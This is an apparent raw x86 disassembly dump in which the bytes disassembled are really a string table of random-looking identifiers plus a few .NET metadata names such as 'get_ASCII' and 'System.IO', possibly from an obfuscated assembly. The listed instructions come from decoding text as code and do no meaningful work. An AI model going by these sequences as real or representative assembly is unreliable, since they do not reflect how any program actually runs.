  407624:	75 4a                	jne    0x407670
  407626:	75 4c                	jne    0x407674
  407628:	77 64                	ja     0x40768e
  40762a:	6e                   	outsb  %ds:(%esi),(%dx)
  40762b:	6e                   	outsb  %ds:(%esi),(%dx)
  40762c:	48                   	dec    %eax
  40762d:	47                   	inc    %edi
  40762e:	65 73 42             	gs jae 0x407673
  407631:	00 47 43             	add    %al,0x43(%edi)
  407634:	00 73 59             	add    %dh,0x59(%ebx)
  407637:	58                   	pop    %eax
  407638:	70 54                	jo     0x40768e
  40763a:	6f                   	outsl  %ds:(%esi),(%dx)
  40763b:	4a                   	dec    %edx
  40763c:	71 6c                	jno    0x4076aa
  40763e:	75 4e                	jne    0x40768e
  407640:	43                   	inc    %ebx
  407641:	00 74 75 76          	add    %dh,0x76(%ebp,%esi,2)
  407645:	5a                   	pop    %edx
  407646:	73 43                	jae    0x40768b
  407648:	67 62 6c 45          	bound  %ebp,0x45(%si)
  40764c:	6c                   	insb   (%dx),%es:(%edi)
  40764d:	75 72                	jne    0x4076c1
  40764f:	64 43                	fs inc %ebx
  407651:	00 53 72             	add    %dl,0x72(%ebx)
  407654:	6f                   	outsl  %ds:(%esi),(%dx)
  407655:	7a 4a                	jp     0x4076a1
  407657:	6a 47                	push   $0x47
  407659:	45                   	inc    %ebp
  40765a:	6c                   	insb   (%dx),%es:(%edi)
  40765b:	43                   	inc    %ebx
  40765c:	00 4d 61             	add    %cl,0x61(%ebp)
  40765f:	70 4e                	jo     0x4076af
  407661:	61                   	popa
  407662:	6d                   	insl   (%dx),%es:(%edi)
  407663:	65 54                	gs push %esp
  407665:	6f                   	outsl  %ds:(%esi),(%dx)
  407666:	4f                   	dec    %edi
  407667:	49                   	dec    %ecx
  407668:	44                   	inc    %esp
  407669:	00 67 65             	add    %ah,0x65(%edi)
  40766c:	74 5f                	je     0x4076cd
  40766e:	46                   	inc    %esi
  40766f:	6f                   	outsl  %ds:(%esi),(%dx)
  407670:	72 6d                	jb     0x4076df
  407672:	61                   	popa
  407673:	74 49                	je     0x4076be
  407675:	44                   	inc    %esp
  407676:	00 66 51             	add    %ah,0x51(%esi)
  407679:	62 59 6a             	bound  %ebx,0x6a(%ecx)
  40767c:	51                   	push   %ecx
  40767d:	73 68                	jae    0x4076e7
  40767f:	62 43 5a             	bound  %eax,0x5a(%ebx)
  407682:	4c                   	dec    %esp
  407683:	44                   	inc    %esp
  407684:	00 55 6f             	add    %dl,0x6f(%ebp)
  407687:	67 52                	addr16 push %edx
  407689:	42                   	inc    %edx
  40768a:	62 57 69             	bound  %edx,0x69(%edi)
  40768d:	4f                   	dec    %edi
  40768e:	62 6e 52             	bound  %ebp,0x52(%esi)
  407691:	48                   	dec    %eax
  407692:	55                   	push   %ebp
  407693:	44                   	inc    %esp
  407694:	00 61 74             	add    %ah,0x74(%ecx)
  407697:	72 4c                	jb     0x4076e5
  407699:	48                   	dec    %eax
  40769a:	62 4e 59             	bound  %ecx,0x59(%esi)
  40769d:	79 4e                	jns    0x4076ed
  40769f:	64 6f                	outsl  %fs:(%esi),(%dx)
  4076a1:	44                   	inc    %esp
  4076a2:	00 68 70             	add    %ch,0x70(%eax)
  4076a5:	53                   	push   %ebx
  4076a6:	48                   	dec    %eax
  4076a7:	70 4b                	jo     0x4076f4
  4076a9:	73 53                	jae    0x4076fe
  4076ab:	67 76 44             	addr16 jbe 0x4076f2
  4076ae:	00 65 63             	add    %ah,0x63(%ebp)
  4076b1:	77 50                	ja     0x407703
  4076b3:	70 52                	jo     0x407707
  4076b5:	52                   	push   %edx
  4076b6:	64 6b 48 6a 46       	imul   $0x46,%fs:0x6a(%eax),%ecx
  4076bb:	45                   	inc    %ebp
  4076bc:	00 7a 62             	add    %bh,0x62(%edx)
  4076bf:	65 61                	gs popa
  4076c1:	4a                   	dec    %edx
  4076c2:	6d                   	insl   (%dx),%es:(%edi)
  4076c3:	75 54                	jne    0x407719
  4076c5:	4b                   	dec    %ebx
  4076c6:	53                   	push   %ebx
  4076c7:	63 63 7a             	arpl   %esp,0x7a(%ebx)
  4076ca:	49                   	dec    %ecx
  4076cb:	45                   	inc    %ebp
  4076cc:	00 66 63             	add    %ah,0x63(%esi)
  4076cf:	47                   	inc    %edi
  4076d0:	6a 6d                	push   $0x6d
  4076d2:	45                   	inc    %ebp
  4076d3:	6d                   	insl   (%dx),%es:(%edi)
  4076d4:	6a 4f                	push   $0x4f
  4076d6:	65 6b 64 45 00 54    	imul   $0x54,%gs:0x0(%ebp,%eax,2),%esp
  4076dc:	68 6d 7a 52 55       	push   $0x55527a6d
  4076e1:	65 71 69             	gs jno 0x40774d
  4076e4:	50                   	push   %eax
  4076e5:	4b                   	dec    %ebx
  4076e6:	58                   	pop    %eax
  4076e7:	6e                   	outsb  %ds:(%esi),(%dx)
  4076e8:	45                   	inc    %ebp
  4076e9:	00 49 56             	add    %cl,0x56(%ecx)
  4076ec:	44                   	inc    %esp
  4076ed:	58                   	pop    %eax
  4076ee:	53                   	push   %ebx
  4076ef:	71 4d                	jno    0x40773e
  4076f1:	68 44 71 45 00       	push   $0x457144
  4076f6:	44                   	inc    %esp
  4076f7:	66 69 67 61 6b 42    	imul   $0x426b,0x61(%edi),%sp
  4076fd:	54                   	push   %esp
  4076fe:	51                   	push   %ecx
  4076ff:	45                   	inc    %ebp
  407700:	79 79                	jns    0x40777b
  407702:	45                   	inc    %ebp
  407703:	00 73 53             	add    %dh,0x53(%ebx)
  407706:	74 7a                	je     0x407782
  407708:	7a 56                	jp     0x407760
  40770a:	65 42                	gs inc %edx
  40770c:	43                   	inc    %ebx
  40770d:	46                   	inc    %esi
  40770e:	00 64 76 73          	add    %ah,0x73(%esi,%esi,2)
  407712:	52                   	push   %edx
  407713:	46                   	inc    %esi
  407714:	48                   	dec    %eax
  407715:	49                   	dec    %ecx
  407716:	65 49                	gs dec %ecx
  407718:	71 69                	jno    0x407783
  40771a:	63 44 46 00          	arpl   %eax,0x0(%esi,%eax,2)
  40771e:	64 4c                	fs dec %esp
  407720:	58                   	pop    %eax
  407721:	55                   	push   %ebp
  407722:	51                   	push   %ecx
  407723:	52                   	push   %edx
  407724:	6b 46 75 61          	imul   $0x61,0x75(%esi),%eax
  407728:	58                   	pop    %eax
  407729:	45                   	inc    %ebp
  40772a:	45                   	inc    %ebp
  40772b:	46                   	inc    %esi
  40772c:	00 49 72             	add    %cl,0x72(%ecx)
  40772f:	48                   	dec    %eax
  407730:	6d                   	insl   (%dx),%es:(%edi)
  407731:	71 4c                	jno    0x40777f
  407733:	6f                   	outsl  %ds:(%esi),(%dx)
  407734:	76 42                	jbe    0x407778
  407736:	66 75 4c             	data16 jne 0x407785
  407739:	46                   	inc    %esi
  40773a:	00 5a 73             	add    %bl,0x73(%edx)
  40773d:	49                   	dec    %ecx
  40773e:	4e                   	dec    %esi
  40773f:	70 57                	jo     0x407798
  407741:	49                   	dec    %ecx
  407742:	55                   	push   %ebp
  407743:	77 74                	ja     0x4077b9
  407745:	72 4f                	jb     0x407796
  407747:	46                   	inc    %esi
  407748:	00 69 4e             	add    %ch,0x4e(%ecx)
  40774b:	78 71                	js     0x4077be
  40774d:	42                   	inc    %edx
  40774e:	64 4e                	fs dec %esi
  407750:	58                   	pop    %eax
  407751:	61                   	popa
  407752:	70 67                	jo     0x4077bb
  407754:	51                   	push   %ecx
  407755:	46                   	inc    %esi
  407756:	00 4d 46             	add    %cl,0x46(%ebp)
  407759:	42                   	inc    %edx
  40775a:	65 52                	gs push %edx
  40775c:	72 7a                	jb     0x4077d8
  40775e:	78 63                	js     0x4077c3
  407760:	49                   	dec    %ecx
  407761:	54                   	push   %esp
  407762:	46                   	inc    %esi
  407763:	00 58 5a             	add    %bl,0x5a(%eax)
  407766:	49                   	dec    %ecx
  407767:	59                   	pop    %ecx
  407768:	4c                   	dec    %esp
  407769:	77 43                	ja     0x4077ae
  40776b:	65 78 53             	gs js  0x4077c1
  40776e:	76 6b                	jbe    0x4077db
  407770:	50                   	push   %eax
  407771:	63 46 00             	arpl   %eax,0x0(%esi)
  407774:	58                   	pop    %eax
  407775:	44                   	inc    %esp
  407776:	46                   	inc    %esi
  407777:	77 45                	ja     0x4077be
  407779:	68 65 50 64 6a       	push   $0x6a645065
  40777e:	6c                   	insb   (%dx),%es:(%edi)
  40777f:	46                   	inc    %esi
  407780:	00 48 79             	add    %cl,0x79(%eax)
  407783:	58                   	pop    %eax
  407784:	58                   	pop    %eax
  407785:	4b                   	dec    %ebx
  407786:	6f                   	outsl  %ds:(%esi),(%dx)
  407787:	74 71                	je     0x4077fa
  407789:	7a 78                	jp     0x407803
  40778b:	79 44                	jns    0x4077d1
  40778d:	73 46                	jae    0x4077d5
  40778f:	00 51 45             	add    %dl,0x45(%ecx)
  407792:	4f                   	dec    %edi
  407793:	44                   	inc    %esp
  407794:	7a 59                	jp     0x4077ef
  407796:	78 4e                	js     0x4077e6
  407798:	51                   	push   %ecx
  407799:	56                   	push   %esi
  40779a:	57                   	push   %edi
  40779b:	66 77 46             	data16 ja 0x4077e4
  40779e:	00 68 41             	add    %ch,0x41(%eax)
  4077a1:	73 6e                	jae    0x407811
  4077a3:	49                   	dec    %ecx
  4077a4:	53                   	push   %ebx
  4077a5:	62 6e 79             	bound  %ebp,0x79(%esi)
  4077a8:	46                   	inc    %esi
  4077a9:	00 61 51             	add    %ah,0x51(%ecx)
  4077ac:	56                   	push   %esi
  4077ad:	77 57                	ja     0x407806
  4077af:	65 68 5a 74 42 47    	gs push $0x4742745a
  4077b5:	00 4f 6e             	add    %cl,0x6e(%edi)
  4077b8:	4e                   	dec    %esi
  4077b9:	49                   	dec    %ecx
  4077ba:	44                   	inc    %esp
  4077bb:	75 54                	jne    0x407811
  4077bd:	72 72                	jb     0x407831
  4077bf:	59                   	pop    %ecx
  4077c0:	65 47                	gs inc %edi
  4077c2:	47                   	inc    %edi
  4077c3:	00 43 42             	add    %al,0x42(%ebx)
  4077c6:	4e                   	dec    %esi
  4077c7:	4c                   	dec    %esp
  4077c8:	61                   	popa
  4077c9:	66 4e                	dec    %si
  4077cb:	57                   	push   %edi
  4077cc:	72 4f                	jb     0x40781d
  4077ce:	4f                   	dec    %edi
  4077cf:	49                   	dec    %ecx
  4077d0:	47                   	inc    %edi
  4077d1:	00 56 48             	add    %dl,0x48(%esi)
  4077d4:	64 67 56             	fs addr16 push %esi
  4077d7:	77 78                	ja     0x407851
  4077d9:	46                   	inc    %esi
  4077da:	41                   	inc    %ecx
  4077db:	61                   	popa
  4077dc:	68 4a 63 52 41       	push   $0x4152634a
  4077e1:	52                   	push   %edx
  4077e2:	47                   	inc    %edi
  4077e3:	00 54 79 42          	add    %dl,0x42(%ecx,%edi,2)
  4077e7:	43                   	inc    %ebx
  4077e8:	46                   	inc    %esi
  4077e9:	50                   	push   %eax
  4077ea:	6a 54                	push   $0x54
  4077ec:	5a                   	pop    %edx
  4077ed:	43                   	inc    %ebx
  4077ee:	4a                   	dec    %edx
  4077ef:	52                   	push   %edx
  4077f0:	47                   	inc    %edi
  4077f1:	00 4e 58             	add    %cl,0x58(%esi)
  4077f4:	6b 51 76 71          	imul   $0x71,0x76(%ecx),%edx
  4077f8:	79 67                	jns    0x407861
  4077fa:	47                   	inc    %edi
  4077fb:	45                   	inc    %ebp
  4077fc:	4a                   	dec    %edx
  4077fd:	62 47 00             	bound  %eax,0x0(%edi)
  407800:	49                   	dec    %ecx
  407801:	50                   	push   %eax
  407802:	47                   	inc    %edi
  407803:	68 41 50 56 69       	push   $0x69565041
  407808:	70 58                	jo     0x407862
  40780a:	71 47                	jno    0x407853
  40780c:	00 65 43             	add    %ah,0x43(%ebp)
  40780f:	69 74 55 43 51 6c 70 	imul   $0x73706c51,0x43(%ebp,%edx,2),%esi
  407816:	73 
  407817:	66 76 47             	data16 jbe 0x407861
  40781a:	00 61 75             	add    %ah,0x75(%ecx)
  40781d:	71 4c                	jno    0x40786b
  40781f:	57                   	push   %edi
  407820:	58                   	pop    %eax
  407821:	61                   	popa
  407822:	63 70 47             	arpl   %esi,0x47(%eax)
  407825:	42                   	inc    %edx
  407826:	48                   	dec    %eax
  407827:	00 41 77             	add    %al,0x77(%ecx)
  40782a:	6a 77                	push   $0x77
  40782c:	44                   	inc    %esp
  40782d:	4a                   	dec    %edx
  40782e:	4a                   	dec    %edx
  40782f:	74 6d                	je     0x40789e
  407831:	44                   	inc    %esp
  407832:	4e                   	dec    %esi
  407833:	48                   	dec    %eax
  407834:	00 67 78             	add    %ah,0x78(%edi)
  407837:	58                   	pop    %eax
  407838:	4a                   	dec    %edx
  407839:	68 52 49 4a 6d       	push   $0x6d4a4952
  40783e:	67 45                	addr16 inc %ebp
  407840:	58                   	pop    %eax
  407841:	52                   	push   %edx
  407842:	48                   	dec    %eax
  407843:	00 69 6b             	add    %ch,0x6b(%ecx)
  407846:	54                   	push   %esp
  407847:	45                   	inc    %ebp
  407848:	69 4e 42 64 64 75 6b 	imul   $0x6b756464,0x42(%esi),%ecx
  40784f:	41                   	inc    %ecx
  407850:	56                   	push   %esi
  407851:	48                   	dec    %eax
  407852:	00 6a 69             	add    %ch,0x69(%edx)
  407855:	4d                   	dec    %ebp
  407856:	76 69                	jbe    0x4078c1
  407858:	72 52                	jb     0x4078ac
  40785a:	48                   	dec    %eax
  40785b:	64 53                	fs push %ebx
  40785d:	61                   	popa
  40785e:	48                   	dec    %eax
  40785f:	00 52 68             	add    %dl,0x68(%edx)
  407862:	66 73 79             	data16 jae 0x4078de
  407865:	55                   	push   %ebp
  407866:	68 4a 62 48 00       	push   $0x48624a
  40786b:	4b                   	dec    %ebx
  40786c:	75 4c                	jne    0x4078ba
  40786e:	41                   	inc    %ecx
  40786f:	78 72                	js     0x4078e3
  407871:	7a 75                	jp     0x4078e8
  407873:	63 48 00             	arpl   %ecx,0x0(%eax)
  407876:	77 46                	ja     0x4078be
  407878:	52                   	push   %edx
  407879:	62 4e 46             	bound  %ecx,0x46(%esi)
  40787c:	69 78 74 62 75 48 78 	imul   $0x78487562,0x74(%eax),%edi
  407883:	48                   	dec    %eax
  407884:	00 67 65             	add    %ah,0x65(%edi)
  407887:	74 5f                	je     0x4078e8
  407889:	41                   	inc    %ecx
  40788a:	53                   	push   %ebx
  40788b:	43                   	inc    %ebx
  40788c:	49                   	dec    %ecx
  40788d:	49                   	dec    %ecx
  40788e:	00 6f 4e             	add    %ch,0x4e(%edi)
  407891:	78 6f                	js     0x407902
  407893:	4e                   	dec    %esi
  407894:	62 71 43             	bound  %esi,0x43(%ecx)
  407897:	59                   	pop    %ecx
  407898:	4e                   	dec    %esi
  407899:	49                   	dec    %ecx
  40789a:	00 5a 4c             	add    %bl,0x4c(%edx)
  40789d:	6c                   	insb   (%dx),%es:(%edi)
  40789e:	68 61 5a 43 74       	push   $0x74435a61
  4078a3:	45                   	inc    %ebp
  4078a4:	79 51                	jns    0x4078f7
  4078a6:	59                   	pop    %ecx
  4078a7:	49                   	dec    %ecx
  4078a8:	00 78 58             	add    %bh,0x58(%eax)
  4078ab:	71 6f                	jno    0x40791c
  4078ad:	62 6d 7a             	bound  %ebp,0x7a(%ebp)
  4078b0:	41                   	inc    %ecx
  4078b1:	50                   	push   %eax
  4078b2:	5a                   	pop    %edx
  4078b3:	49                   	dec    %ecx
  4078b4:	00 74 63 72          	add    %dh,0x72(%ebx,%eiz,2)
  4078b8:	4b                   	dec    %ebx
  4078b9:	50                   	push   %eax
  4078ba:	76 46                	jbe    0x407902
  4078bc:	71 61                	jno    0x40791f
  4078be:	49                   	dec    %ecx
  4078bf:	00 61 6a             	add    %ah,0x6a(%ecx)
  4078c2:	76 67                	jbe    0x40792b
  4078c4:	5a                   	pop    %edx
  4078c5:	73 55                	jae    0x40791c
  4078c7:	58                   	pop    %eax
  4078c8:	54                   	push   %esp
  4078c9:	66 76 63             	data16 jbe 0x40792f
  4078cc:	49                   	dec    %ecx
  4078cd:	00 50 4b             	add    %dl,0x4b(%eax)
  4078d0:	4d                   	dec    %ebp
  4078d1:	5a                   	pop    %edx
  4078d2:	55                   	push   %ebp
  4078d3:	51                   	push   %ecx
  4078d4:	55                   	push   %ebp
  4078d5:	46                   	inc    %esi
  4078d6:	69 49 00 43 48 68 4f 	imul   $0x4f684843,0x0(%ecx),%ecx
  4078dd:	57                   	push   %edi
  4078de:	46                   	inc    %esi
  4078df:	55                   	push   %ebp
  4078e0:	61                   	popa
  4078e1:	47                   	inc    %edi
  4078e2:	73 76                	jae    0x40795a
  4078e4:	6c                   	insb   (%dx),%es:(%edi)
  4078e5:	55                   	push   %ebp
  4078e6:	4c                   	dec    %esp
  4078e7:	69 49 00 6b 71 4b 58 	imul   $0x584b716b,0x0(%ecx),%ecx
  4078ee:	62 53 4b             	bound  %edx,0x4b(%ebx)
  4078f1:	68 70 49 00 50       	push   $0x50004970
  4078f6:	70 44                	jo     0x40793c
  4078f8:	77 6e                	ja     0x407968
  4078fa:	6d                   	insl   (%dx),%es:(%edi)
  4078fb:	71 69                	jno    0x407966
  4078fd:	73 49                	jae    0x407948
  4078ff:	00 72 49             	add    %dh,0x49(%edx)
  407902:	59                   	pop    %ecx
  407903:	6f                   	outsl  %ds:(%esi),(%dx)
  407904:	69 46 4c 44 6f 74 49 	imul   $0x49746f44,0x4c(%esi),%eax
  40790b:	00 4b 46             	add    %cl,0x46(%ebx)
  40790e:	71 76                	jno    0x407986
  407910:	69 51 4b 4b 4e 75 76 	imul   $0x76754e4b,0x4b(%ecx),%edx
  407917:	49                   	dec    %ecx
  407918:	00 68 5a             	add    %ch,0x5a(%eax)
  40791b:	69 55 64 63 64 43 42 	imul   $0x42436463,0x64(%ebp),%edx
  407922:	72 46                	jb     0x40796a
  407924:	43                   	inc    %ebx
  407925:	4a                   	dec    %edx
  407926:	00 55 43             	add    %dl,0x43(%ebp)
  407929:	70 4f                	jo     0x40797a
  40792b:	46                   	inc    %esi
  40792c:	6e                   	outsb  %ds:(%esi),(%dx)
  40792d:	6c                   	insb   (%dx),%es:(%edi)
  40792e:	43                   	inc    %ebx
  40792f:	71 44                	jno    0x407975
  407931:	4a                   	dec    %edx
  407932:	00 64 71 50          	add    %ah,0x50(%ecx,%esi,2)
  407936:	61                   	popa
  407937:	79 43                	jns    0x40797c
  407939:	77 6e                	ja     0x4079a9
  40793b:	6b 71 66 48          	imul   $0x48,0x66(%ecx),%esi
  40793f:	4a                   	dec    %edx
  407940:	00 74 66 43          	add    %dh,0x43(%esi,%eiz,2)
  407944:	6e                   	outsb  %ds:(%esi),(%dx)
  407945:	55                   	push   %ebp
  407946:	54                   	push   %esp
  407947:	65 63 49 4a          	arpl   %ecx,%gs:0x4a(%ecx)
  40794b:	00 4e 49             	add    %cl,0x49(%esi)
  40794e:	4b                   	dec    %ebx
  40794f:	4a                   	dec    %edx
  407950:	44                   	inc    %esp
  407951:	74 66                	je     0x4079b9
  407953:	77 53                	ja     0x4079a8
  407955:	42                   	inc    %edx
  407956:	44                   	inc    %esp
  407957:	6f                   	outsl  %ds:(%esi),(%dx)
  407958:	4a                   	dec    %edx
  407959:	00 78 54             	add    %bh,0x54(%eax)
  40795c:	4f                   	dec    %edi
  40795d:	7a 4b                	jp     0x4079aa
  40795f:	77 68                	ja     0x4079c9
  407961:	50                   	push   %eax
  407962:	45                   	inc    %ebp
  407963:	4b                   	dec    %ebx
  407964:	00 53 70             	add    %dl,0x70(%ebx)
  407967:	69 75 54 67 6d 58 6e 	imul   $0x6e586d67,0x54(%ebp),%esi
  40796e:	54                   	push   %esp
  40796f:	64 6c                	fs insb (%dx),%es:(%edi)
  407971:	4a                   	dec    %edx
  407972:	4f                   	dec    %edi
  407973:	4b                   	dec    %ebx
  407974:	00 6d 4d             	add    %ch,0x4d(%ebp)
  407977:	73 4e                	jae    0x4079c7
  407979:	57                   	push   %edi
  40797a:	41                   	inc    %ecx
  40797b:	49                   	dec    %ecx
  40797c:	41                   	inc    %ecx
  40797d:	4a                   	dec    %edx
  40797e:	7a 51                	jp     0x4079d1
  407980:	4b                   	dec    %ebx
  407981:	00 66 70             	add    %ah,0x70(%esi)
  407984:	42                   	inc    %edx
  407985:	69 55 4c 41 75 6c 73 	imul   $0x736c7541,0x4c(%ebp),%edx
  40798c:	43                   	inc    %ebx
  40798d:	66 6c                	data16 insb (%dx),%es:(%edi)
  40798f:	56                   	push   %esi
  407990:	4b                   	dec    %ebx
  407991:	00 78 67             	add    %bh,0x67(%eax)
  407994:	56                   	push   %esi
  407995:	49                   	dec    %ecx
  407996:	57                   	push   %edi
  407997:	53                   	push   %ebx
  407998:	6b 48 70 67          	imul   $0x67,0x70(%eax),%ecx
  40799c:	4b                   	dec    %ebx
  40799d:	00 49 6b             	add    %cl,0x6b(%ecx)
  4079a0:	54                   	push   %esp
  4079a1:	47                   	inc    %edi
  4079a2:	59                   	pop    %ecx
  4079a3:	78 52                	js     0x4079f7
  4079a5:	6d                   	insl   (%dx),%es:(%edi)
  4079a6:	6b 7a 6e 4b          	imul   $0x4b,0x6e(%edx),%edi
  4079aa:	00 52 7a             	add    %dl,0x7a(%edx)
  4079ad:	66 77 78             	data16 ja 0x407a28
  4079b0:	41                   	inc    %ecx
  4079b1:	63 67 7a             	arpl   %esp,0x7a(%edi)
  4079b4:	4b                   	dec    %ebx
  4079b5:	00 61 57             	add    %ah,0x57(%ecx)
  4079b8:	66 74 43             	data16 je 0x4079fe
  4079bb:	61                   	popa
  4079bc:	4e                   	dec    %esi
  4079bd:	75 4e                	jne    0x407a0d
  4079bf:	62 59 5a             	bound  %ebx,0x5a(%ecx)
  4079c2:	4c                   	dec    %esp
  4079c3:	00 75 42             	add    %dh,0x42(%ebp)
  4079c6:	43                   	inc    %ebx
  4079c7:	44                   	inc    %esp
  4079c8:	63 54 5a 58          	arpl   %edx,0x58(%edx,%ebx,2)
  4079cc:	4d                   	dec    %ebp
  4079cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4079ce:	64 4c                	fs dec %esp
  4079d0:	00 58 46             	add    %bl,0x46(%eax)
  4079d3:	49                   	dec    %ecx
  4079d4:	70 49                	jo     0x407a1f
  4079d6:	77 43                	ja     0x407a1b
  4079d8:	73 77                	jae    0x407a51
  4079da:	64 4c                	fs dec %esp
  4079dc:	00 74 63 58          	add    %dh,0x58(%ebx,%eiz,2)
  4079e0:	51                   	push   %ecx
  4079e1:	68 6d 6f 4b 52       	push   $0x524b6f6d
  4079e6:	78 69                	js     0x407a51
  4079e8:	4c                   	dec    %esp
  4079e9:	00 68 71             	add    %ch,0x71(%eax)
  4079ec:	43                   	inc    %ebx
  4079ed:	47                   	inc    %edi
  4079ee:	6b 6a 55 69          	imul   $0x69,0x55(%edx),%ebp
  4079f2:	65 6d                	gs insl (%dx),%es:(%edi)
  4079f4:	4c                   	dec    %esp
  4079f5:	00 65 64             	add    %ah,0x64(%ebp)
  4079f8:	66 65 62 43 50       	bound  %ax,%gs:0x50(%ebx)
  4079fd:	6c                   	insb   (%dx),%es:(%edi)
  4079fe:	7a 67                	jp     0x407a67
  407a00:	66 50                	push   %ax
  407a02:	66 6e                	data16 outsb %ds:(%esi),(%dx)
  407a04:	4c                   	dec    %esp
  407a05:	00 71 59             	add    %dh,0x59(%ecx)
  407a08:	43                   	inc    %ebx
  407a09:	77 4e                	ja     0x407a59
  407a0b:	76 62                	jbe    0x407a6f
  407a0d:	73 53                	jae    0x407a62
  407a0f:	4c                   	dec    %esp
  407a10:	57                   	push   %edi
  407a11:	43                   	inc    %ebx
  407a12:	56                   	push   %esi
  407a13:	44                   	inc    %esp
  407a14:	4d                   	dec    %ebp
  407a15:	00 7a 70             	add    %bh,0x70(%edx)
  407a18:	6c                   	insb   (%dx),%es:(%edi)
  407a19:	64 61                	fs popa
  407a1b:	73 42                	jae    0x407a5f
  407a1d:	54                   	push   %esp
  407a1e:	74 65                	je     0x407a85
  407a20:	78 4e                	js     0x407a70
  407a22:	4d                   	dec    %ebp
  407a23:	00 51 62             	add    %dl,0x62(%ecx)
  407a26:	4a                   	dec    %edx
  407a27:	61                   	popa
  407a28:	49                   	dec    %ecx
  407a29:	69 68 4a 4f 52 50 4d 	imul   $0x4d50524f,0x4a(%eax),%ebp
  407a30:	00 50 55             	add    %dl,0x55(%eax)
  407a33:	56                   	push   %esi
  407a34:	4d                   	dec    %ebp
  407a35:	53                   	push   %ebx
  407a36:	78 6f                	js     0x407aa7
  407a38:	50                   	push   %eax
  407a39:	43                   	inc    %ebx
  407a3a:	79 4e                	jns    0x407a8a
  407a3c:	4b                   	dec    %ebx
  407a3d:	71 59                	jno    0x407a98
  407a3f:	4d                   	dec    %ebp
  407a40:	00 66 78             	add    %ah,0x78(%esi)
  407a43:	71 4f                	jno    0x407a94
  407a45:	53                   	push   %ebx
  407a46:	75 4d                	jne    0x407a95
  407a48:	61                   	popa
  407a49:	6c                   	insb   (%dx),%es:(%edi)
  407a4a:	4c                   	dec    %esp
  407a4b:	69 62 64 4d 00 6b 51 	imul   $0x516b004d,0x64(%edx),%esp
  407a52:	73 71                	jae    0x407ac5
  407a54:	4a                   	dec    %edx
  407a55:	5a                   	pop    %edx
  407a56:	75 6f                	jne    0x407ac7
  407a58:	5a                   	pop    %edx
  407a59:	78 59                	js     0x407ab4
  407a5b:	59                   	pop    %ecx
  407a5c:	61                   	popa
  407a5d:	73 67                	jae    0x407ac6
  407a5f:	4d                   	dec    %ebp
  407a60:	00 49 6c             	add    %cl,0x6c(%ecx)
  407a63:	42                   	inc    %edx
  407a64:	52                   	push   %edx
  407a65:	42                   	inc    %edx
  407a66:	73 66                	jae    0x407ace
  407a68:	68 59 5a 54 50       	push   $0x50545a59
  407a6d:	4e                   	dec    %esi
  407a6e:	00 48 6c             	add    %cl,0x6c(%eax)
  407a71:	50                   	push   %eax
  407a72:	4c                   	dec    %esp
  407a73:	62 52 6b             	bound  %edx,0x6b(%edx)
  407a76:	79 6b                	jns    0x407ae3
  407a78:	4b                   	dec    %ebx
  407a79:	42                   	inc    %edx
  407a7a:	56                   	push   %esi
  407a7b:	57                   	push   %edi
  407a7c:	55                   	push   %ebp
  407a7d:	4e                   	dec    %esi
  407a7e:	00 4e 49             	add    %cl,0x49(%esi)
  407a81:	6e                   	outsb  %ds:(%esi),(%dx)
  407a82:	71 47                	jno    0x407acb
  407a84:	5a                   	pop    %edx
  407a85:	62 66 64             	bound  %esp,0x64(%esi)
  407a88:	4e                   	dec    %esi
  407a89:	00 73 41             	add    %dh,0x41(%ebx)
  407a8c:	6f                   	outsl  %ds:(%esi),(%dx)
  407a8d:	79 75                	jns    0x407b04
  407a8f:	73 4b                	jae    0x407adc
  407a91:	64 67 52             	fs addr16 push %edx
  407a94:	6a 77                	push   $0x77
  407a96:	66 4e                	dec    %si
  407a98:	00 45 53             	add    %al,0x53(%ebp)
  407a9b:	53                   	push   %ebx
  407a9c:	54                   	push   %esp
  407a9d:	58                   	pop    %eax
  407a9e:	44                   	inc    %esp
  407a9f:	54                   	push   %esp
  407aa0:	74 73                	je     0x407b15
  407aa2:	4e                   	dec    %esi
  407aa3:	00 71 63             	add    %dh,0x63(%ecx)
  407aa6:	76 77                	jbe    0x407b1f
  407aa8:	4b                   	dec    %ebx
  407aa9:	75 73                	jne    0x407b1e
  407aab:	4c                   	dec    %esp
  407aac:	77 63                	ja     0x407b11
  407aae:	63 44 4f 00          	arpl   %eax,0x0(%edi,%ecx,2)
  407ab2:	44                   	inc    %esp
  407ab3:	4d                   	dec    %ebp
  407ab4:	52                   	push   %edx
  407ab5:	50                   	push   %eax
  407ab6:	75 72                	jne    0x407b2a
  407ab8:	76 68                	jbe    0x407b22
  407aba:	55                   	push   %ebp
  407abb:	54                   	push   %esp
  407abc:	45                   	inc    %ebp
  407abd:	4f                   	dec    %edi
  407abe:	00 78 67             	add    %bh,0x67(%eax)
  407ac1:	78 51                	js     0x407b14
  407ac3:	6f                   	outsl  %ds:(%esi),(%dx)
  407ac4:	59                   	pop    %ecx
  407ac5:	5a                   	pop    %edx
  407ac6:	6a 51                	push   $0x51
  407ac8:	44                   	inc    %esp
  407ac9:	46                   	inc    %esi
  407aca:	4f                   	dec    %edi
  407acb:	00 53 79             	add    %dl,0x79(%ebx)
  407ace:	73 74                	jae    0x407b44
  407ad0:	65 6d                	gs insl (%dx),%es:(%edi)
  407ad2:	2e 49                	cs dec %ecx
  407ad4:	4f                   	dec    %edi
  407ad5:	00 77 43             	add    %dh,0x43(%edi)
  407ad8:	56                   	push   %esi
  407ad9:	45                   	inc    %ebp
  407ada:	6f                   	outsl  %ds:(%esi),(%dx)
  407adb:	48                   	dec    %eax
  407adc:	61                   	popa
  407add:	66 6d                	insw   (%dx),%es:(%edi)
  407adf:	4f                   	dec    %edi
  407ae0:	53                   	push   %ebx
  407ae1:	4f                   	dec    %edi
  407ae2:	00 74 66 50          	add    %dh,0x50(%esi,%eiz,2)
  407ae6:	76 55                	jbe    0x407b3d
  407ae8:	47                   	inc    %edi
  407ae9:	42                   	inc    %edx
  407aea:	66 46                	inc    %si
  407aec:	4e                   	dec    %esi
  407aed:	76 5a                	jbe    0x407b49
  407aef:	4f                   	dec    %edi
  407af0:	00 77 43             	add    %dh,0x43(%edi)
  407af3:	64 41                	fs inc %ecx
  407af5:	4f                   	dec    %edi
  407af6:	46                   	inc    %esi
  407af7:	6f                   	outsl  %ds:(%esi),(%dx)
  407af8:	48                   	dec    %eax
  407af9:	63 4f 00             	arpl   %ecx,0x0(%edi)
  407afc:	4b                   	dec    %ebx
  407afd:	46                   	inc    %esi
  407afe:	4b                   	dec    %ebx
  407aff:	43                   	inc    %ebx
  407b00:	6c                   	insb   (%dx),%es:(%edi)
  407b01:	61                   	popa
  407b02:	45                   	inc    %ebp
  407b03:	61                   	popa
